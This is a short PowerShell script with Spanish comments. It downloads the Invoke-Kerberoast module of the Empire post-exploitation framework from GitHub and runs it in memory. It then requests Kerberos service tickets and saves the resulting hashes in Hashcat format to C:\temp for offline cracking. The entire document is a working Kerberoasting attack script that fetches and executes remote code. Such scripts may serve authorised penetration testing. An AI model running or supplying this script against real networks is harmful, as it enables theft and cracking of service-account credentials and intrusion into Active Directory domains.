# URL del script de GitHub
$url = "https://raw.githubusercontent.com/t31m0/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"

# Ruta local donde se guardará el script
$localPath = "C:\temp\Invoke-Kerberoast.ps1"

# Verificar y crear la carpeta C:\temp si no existe
if (-not (Test-Path -Path "C:\temp")) {
    New-Item -Path "C:\temp" -ItemType Directory
}

# Descargar el script de GitHub
Invoke-WebRequest -Uri $url -OutFile $localPath

# Ejecutar el script descargado
. $localPath

# Utilizar la función del script descargado
$kerberoastData = Invoke-Kerberoast -OutputFormat Hashcat

# Guardar los datos en un archivo
$kerberoastData | Out-File -FilePath "C:\temp\kerberoast_hashes.txt"

# Mostrar la información en la consola
$kerberoastData
